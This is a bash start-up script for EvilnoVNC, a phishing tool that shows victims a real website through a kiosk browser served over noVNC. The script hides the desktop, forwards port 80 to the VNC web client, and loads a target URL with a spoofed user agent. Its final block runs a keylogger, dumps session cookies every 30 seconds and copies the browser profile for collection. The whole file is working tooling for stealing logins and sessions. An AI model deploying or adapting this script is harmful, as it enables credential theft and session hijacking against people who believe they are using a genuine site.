#!/bin/bash
#=============================#
#   EvilnoVNC by @JoelGMSec   #
#     https://darkbyte.net    #
#=============================#

DISPLAY=:1
sudo rm -f /tmp/.X${DISPLAY#:}-lock

export RESOLUTION=$(cat /tmp/resolution.txt 2> /dev/null)
RESOLUTION=${RESOLUTION:-1920x1080x24}
echo 'starting with' $RESOLUTION

nohup sudo rm -f "/etc/xdg/xfce4/xfconf/xfce-perchannel-xml/xfce4-keyboard-shortcuts.xml"
nohup sudo /usr/bin/Xvfb $DISPLAY -screen 0 $RESOLUTION -ac +extension GLX +render -noreset &
while [[ ! $(xdpyinfo -display $DISPLAY 2> /dev/null) ]]; do sleep 1; done 
nohup sudo chmod a-rwx /usr/bin/xfdesktop && sudo chmod a-rwx /usr/bin/xfce4-terminal
nohup sudo chmod a-rwx /usr/bin/xfce4-panel && sudo chmod a-rwx /usr/bin/thunar
nohup sudo startxfce4 > /dev/null || true &

nohup sudo x11vnc -xkb -noxrecord -noxfixes -noxdamage -many -shared -display $DISPLAY -rfbauth /home/user/.vnc/passwd -rfbport 5900 "$@" &
nohup sudo /home/user/noVNC/utils/novnc_proxy --vnc localhost:5900 --listen 5980 &
nohup sudo socat TCP-LISTEN:80,reuseaddr,fork TCP:localhost:5980 &

URL=$WEBPAGE
USERAGENT=${USERAGENT:-"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}
CLIENT_LANG=${CLIENT_LANG:-en-US}
cp /home/user/noVNC/vnc_lite.html /home/user/noVNC/index.html
sudo mkdir -p Downloads/Default 2> /dev/null && sudo chmod 777 -R Downloads && sudo chmod 777 kiosk.zip
sudo mkdir -p /var/run/dbus && sudo dbus-daemon --config-file=/usr/share/dbus-1/system.conf --print-address
unzip -n kiosk.zip && sleep 3 && chrome-linux/chrome --no-sandbox --load-extension=/home/user/kiosk/ --kiosk $URL --fast ---fast-start --user-agent="$USERAGENT" --accept-lang=$CLIENT_LANG &

nohup /bin/bash -c "touch /home/user/Downloads/Cookies.txt ; mkdir /home/user/Downloads/Default" &
nohup /bin/bash -c "touch /home/user/Downloads/Keylogger.txt" &
nohup /bin/bash -c "python3 /home/user/keylogger.py 2> log.txt" &
nohup /bin/bash -c "while true ; do sleep 30 ; python3 cookies.py > /home/user/Downloads/Cookies.txt ; done" &
nohup /bin/bash -c "while true ; do sleep 30 ; cp -R -u /home/user/.config/chromium/Default /home/user/Downloads/ ; done" &

while true ; do sleep 30 ; done
